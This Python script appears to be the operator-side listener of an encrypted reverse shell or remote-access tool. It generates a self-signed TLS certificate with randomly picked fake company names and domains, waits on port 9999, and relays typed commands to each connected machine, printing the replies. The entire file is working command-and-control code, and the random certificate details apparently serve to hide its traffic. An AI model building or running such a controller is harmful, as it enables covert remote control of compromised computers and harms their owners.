import socket
import ssl
import os
import random
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from datetime import datetime, timedelta

# Server configuration
HOST = '0.0.0.0'
PORT = 9999

# Paths for the certificate and key files
CERT_FILE = 'server.crt'
KEY_FILE = 'server.key'

def generate_self_signed_cert(cert_file, key_file):
    # Generate private key
    key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )

    # Lists of possible values for each field
    countries = ["US", "CA", "GB", "FR", "DE"]
    states = ["California", "Texas", "New York", "Florida", "Illinois"]
    localities = ["San Francisco", "Los Angeles", "New York City", "Chicago", "Houston"]
    organizations = ["My Company", "Your Company", "Their Company", "Some Company", "Any Company"]
    common_names = ["mycompany.com", "yourcompany.com", "theircompany.com", "somecompany.com", "anycompany.com"]

    # Randomly choose values for the certificate fields
    country = random.choice(countries)
    state = random.choice(states)
    locality = random.choice(localities)
    organization = random.choice(organizations)
    common_name = random.choice(common_names)

    # Generate self-signed certificate
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, country),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, state),
        x509.NameAttribute(NameOID.LOCALITY_NAME, locality),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, organization),
        x509.NameAttribute(NameOID.COMMON_NAME, common_name),
    ])
    cert = x509.CertificateBuilder().subject_name(
        subject
    ).issuer_name(
        issuer
    ).public_key(
        key.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.utcnow()
    ).not_valid_after(
        # Certificate is valid for one year
        datetime.utcnow() + timedelta(days=365)
    ).add_extension(
        x509.SubjectAlternativeName([x509.DNSName(u"localhost")]),
        critical=False,
    ).sign(key, hashes.SHA256())

    # Write the private key to a file
    with open(key_file, "wb") as f:
        f.write(key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption(),
        ))

    # Write the certificate to a file
    with open(cert_file, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))

def start_server():
    # Check if the certificate and key files exist, if not, generate them
    if not os.path.exists(CERT_FILE) or not os.path.exists(KEY_FILE):
        generate_self_signed_cert(CERT_FILE, KEY_FILE)
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")

    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
        
        ssl_client_socket = context.wrap_socket(client_socket, server_side=True)
        handle_client(ssl_client_socket)

def handle_client(client_socket):
    with client_socket:
        while True:
            try:
                command = input("Enter command: ")
                if command.lower() == 'exit':
                    client_socket.send(b'exit')
                    break
                client_socket.send(command.encode())

                response = client_socket.recv(4096)
                print(f"[*] Received: {response.decode('utf-8')}")
            except Exception as e:
                print(f"[!] Error: {e}")
                break

if __name__ == "__main__":
    start_server()
